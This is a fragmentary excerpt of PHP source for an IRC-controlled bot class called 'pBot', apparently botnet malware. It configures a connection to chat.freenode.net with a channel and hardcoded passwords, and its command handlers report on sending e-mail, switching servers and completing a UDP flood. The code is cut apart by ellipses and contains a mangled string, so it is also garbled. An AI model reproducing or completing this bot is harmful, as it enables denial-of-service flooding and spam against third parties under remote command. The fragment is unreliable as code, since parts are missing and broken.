...
class pBot
{
var $config = array("server"=>"chat.freenode.net",
"port"=>6667,
"pass"=>"mehmet123", //password nya mas
"prefix"=>"xest|",
"maxrand"=>8,
"chan"=>"#homebot",
"modes"=>"+p",
"password"=>"mehmet123", //senha do bot
"trigger"=>".",
...
{
$this->privmsg($this->config['chan'],"[\2mail\2]: Isur00tossivel mandar
 
e-mail.");
}
else
{
$this->privmsg($this->config['chan'],"[\2mail\2]: Mensagem enviada para
...
$this->privmsg($this->config['chan'],"[\2update\2]: Server trocado para
...
$vel = round($vel);
$env = round($env);
$this->privmsg($this->config['chan'],"[\2UdpFlood Finished!\2]: $env MB
